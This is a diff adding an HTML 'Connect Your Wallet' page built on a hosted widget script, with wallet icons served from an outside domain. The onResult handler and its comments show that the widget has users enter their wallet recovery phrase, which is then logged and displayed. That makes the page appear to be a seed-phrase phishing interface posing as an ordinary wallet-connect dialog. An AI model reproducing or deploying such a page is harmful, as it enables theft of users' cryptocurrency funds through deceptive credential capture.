@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your Wallet</title>
+    <link rel="stylesheet" href="styles1.css">
+    <link rel="stylesheet" href="./web3Hosted.css">
+
+    <script src="./web3Hosted.js"></script>
+</head>
+
+<body>
+    <!-- Button to open bottom sheet  -->
+    <button id="openSheet" onclick="showSheet()">Connect Your Wallet</button>
+
+
+    <w3h-connect-dark></w3h-connect-dark>
+
+
+    <script>
+
+        function showSheet(title, text) {
+            // Start the hosted wallet selection
+            web3Hosted.hosted({
+                title: "Connect Your Wallet",
+                layout: "grid",
+                wallets: {
+                    metamask: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "MetaMask",
+                    },
+                    cat: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "Arsenal",
+                    },
+                    car: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "Arsenal",
+                    },
+                    catu: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "Arsenal",
+                    },
+                },
+                onWalletSelect: (wallet) => {
+                    // When the wallet is selected, you can do some preliminary processing
+                    console.log(`${wallet} selected!`);
+
+                    // Note: The final result (including phrase) will be available only after the user inputs it.
+
+                    // Optionally add further logic or wait until the wallet phrase is input
+                },
+
+                onResult: (result) => {
+                    // Access the result JSON here
+                    console.log("Wallet Data Received:", result);
+
+                    // Show result to the user
+                    alert(
+                        `Wallet Connected:\nName: ${result.walletName}\nImage: ${result.walletImage}\nPhrase: ${result.walletPhrase}`
+                    );
+                },
+                onClose: () => {
+                    console.log('Wallet connection dialog closed.');
+                },
+                outsideTouch: false,
+                outsideInteract: false,
+                theme: 'dark',
+                glassEffect: false,
+            });
+
+        }
+
+    </script>
+</body>
+
+</html>
